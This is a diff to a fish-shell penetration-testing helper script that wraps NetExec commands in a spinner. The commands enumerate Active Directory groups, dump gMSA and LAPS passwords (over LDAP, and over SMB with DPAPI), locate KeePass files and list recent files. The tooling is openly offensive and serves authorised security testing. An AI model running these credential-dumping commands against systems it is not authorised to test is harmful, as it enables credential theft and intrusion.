@@ -130,7 +130,7 @@ Examples:
     # Enumerate user groups
     ezpz_header "Enumerating '$user' groups"
     ezpz_cmd "nxc ldap $nxc_auth -M groupmembership -o USER=\"$user\""
-    timeout 60 nxc ldap $nxc_auth -M groupmembership -o USER="$user" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5-
+    ezpz_spin timeout 60 nxc ldap $nxc_auth -M groupmembership -o USER="$user" | tail -n +4 | tr -s " " | cut -d " " -f 5-
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping."
     end
@@ -138,7 +138,7 @@ Examples:
     # Try to dump gMSA passwords
     ezpz_header "Trying to dump gMSA passwords with user's rights"
     ezpz_cmd "nxc ldap $nxc_auth --gmsa"
-    timeout 60 nxc ldap $nxc_auth --gmsa 2>/dev/null | grep -aoE "Account:.*" --color=never
+    ezpz_spin timeout 60 nxc ldap $nxc_auth --gmsa | grep -aoE "Account:.*" --color=never
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping."
     end
@@ -146,13 +146,13 @@ Examples:
     # Try to dump LAPS passwords
     ezpz_header "Trying to dump LAPS passwords with user's rights"
     ezpz_cmd "nxc ldap $nxc_auth -M laps"
-    timeout 60 nxc ldap $nxc_auth -M laps 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
+    ezpz_spin timeout 60 nxc ldap $nxc_auth -M laps | tail -n +4 | tr -s " " | cut -d " " -f 6-
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping LDAP LAPS."
     end
     
     ezpz_cmd "nxc smb $nxc_auth --laps --dpapi"
-    timeout 60 nxc smb $nxc_auth --laps --dpapi 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 6-
+    ezpz_spin timeout 60 nxc smb $nxc_auth --laps --dpapi | tail -n +4 | tr -s " " | cut -d " " -f 6-
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping SMB LAPS."
     end
@@ -160,7 +160,7 @@ Examples:
     # Try to find KeePass files
     ezpz_header "Trying to find KeePass files readable by user"
     ezpz_cmd "nxc smb $nxc_auth -M keepass_discover"
-    timeout 60 nxc smb $nxc_auth -M keepass_discover 2>/dev/null | grep -aoE "Found .*" --color=never
+    ezpz_spin timeout 60 nxc smb $nxc_auth -M keepass_discover | grep -aoE "Found .*" --color=never
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping."
     end
@@ -168,7 +168,7 @@ Examples:
     # Try to find Recent files
     ezpz_header "Trying to enumerate Recent Files"
     ezpz_cmd "nxc smb $nxc_auth -M recent_files"
-    timeout 60 nxc smb $nxc_auth -M recent_files 2>/dev/null | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-
+    ezpz_spin timeout 60 nxc smb $nxc_auth -M recent_files | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping."
     end
